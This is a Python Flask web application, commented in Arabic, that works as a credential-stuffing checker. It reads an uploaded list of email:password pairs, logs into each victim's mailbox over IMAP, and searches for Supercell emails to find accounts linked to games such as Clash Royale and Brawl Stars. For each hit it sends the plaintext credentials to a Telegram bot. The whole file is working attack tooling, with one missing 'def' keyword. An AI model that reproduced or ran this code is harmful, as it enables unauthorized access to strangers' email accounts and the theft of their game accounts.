import os
import threading
import imaplib
import email
import re
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# إعدادات البوت والتحكم
BOT_TOKEN = "" # يتم تعبئته أو قراءته من متغيرات البيئة
CHAT_ID = ""   # معرف الدردشة في التليجرام

stats = {
    "hits": 0,
    "bad": 0,
    "unlink": 0,
    "errors": 0,
    "total": 0,
    "processed": 0,
    "status": "ممتنع / بانتظار الملف"
}

IMAP_SERVERS = {
    "gmail.com": "imap.gmail.com", "googlemail.com": "imap.gmail.com",
    "hotmail.com": "imap-mail.outlook.com", "outlook.com": "imap-mail.outlook.com",
    "live.com": "imap-mail.outlook.com", "yahoo.com": "imap.mail.yahoo.com",
    "mail.ru": "imap.mail.ru", "bk.ru": "imap.mail.ru", "yandex.ru": "imap.yandex.com"
}

GAME_KEYWORDS = {
    "Clash Royale": ["Clash Royale", "cr"],
    "Clash of Clans": ["Clash of Clans", "coc"],
    "Hay Day": ["Hay Day", "hd"],
    "Squad Busters": ["Squad Busters", "sb"],
    "Brawl Stars": ["Brawl Stars", "bs"]
}

def send_telegram_alert(message):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": message})
    except:
        pass

def extract_games(text):
    found = set()
    t_low = text.lower()
    for game, kws in GAME_KEYWORDS.items():
        for kw in kws:
            if kw in t_low:
                found.add(game)
                break
    return found

def process_checker(filepath, token, chat_id):
    global BOT_TOKEN, CHAT_ID, stats
    BOT_TOKEN = token
    CHAT_ID = chat_id
    
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        lines = [line.strip() for line in f if ":" in line]
    
    stats["total"] = len(lines)
    stats["processed"] = 0
    stats["hits"] = 0
    stats["bad"] = 0
    stats["unlink"] = 0
    stats["errors"] = 0
    stats["status"] = "جاري الفحص..."

    for line in lines:
        try:
            email_addr, password = line.split(":", 1)
        except:
            stats["processed"] += 1
            continue
        
        domain = email_addr.split('@')[-1].lower()
        imap_server = IMAP_SERVERS.get(domain, "imap." + domain)
        
        try:
            mail = imaplib.IMAP4_SSL(imap_server, timeout=10)
            mail.login(email_addr, password)
            mail.select("INBOX")
            res, data = mail.search(None, 'FROM "noreply@id.supercell.com"')
            email_ids = data[0].split()
            
            if not email_ids:
                stats["bad"] += 1
            else:
                linked_games = set()
                is_unlink = False
                for e_id in email_ids[:5]:
                    _, mdata = mail.fetch(e_id, "(RFC822)")
                    msg = email.message_from_bytes(mdata[0][1])
                    body = msg.get_payload(decode=True)
                    body_str = body.decode(errors="ignore") if body else str(msg)
                    
                    if "changed" in body_str.lower() or "تغيير" in body_str:
                        is_unlink = True
                    linked_games.update(extract_games(body_str))
                
                if is_unlink:
                    stats["unlink"] += 1
                elif linked_games:
                    stats["hits"] += 1
                    msg_text = f"🔥 New Supercell Hit!\n📧 {email_addr}:{password}\n🏆 Games: {list(linked_games)}"
                    send_telegram_alert(msg_text)
                else:
                    stats["bad"] += 1
            mail.logout()
        except:
            stats["errors"] += 1
            stats["bad"] += 1
        
        stats["processed"] += 1
    
    stats["status"] = "انتهى الفحص"

@app.route('/')
index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({"error": "لم يتم رفع اي ملف"})
    
    file = request.files['file']
    token = request.form.get('token', '')
    chat_id = request.form.get('chat_id', '')
    
    if file.filename == '':
        return jsonify({"error": "ملف فارغ"})
    
    filepath = os.path.join("uploaded_combo.txt")
    file.save(filepath)
    
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        line_count = sum(1 for line in f if ":" in line)
    
    # بدء الفحص في ثريد منفصل
    threading.Thread(target=process_checker, args=(filepath, token, chat_id)).start()
    
    return jsonify({"success": True, "lines": line_count})

@app.route('/stats')
def get_stats():
    return jsonify(stats)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
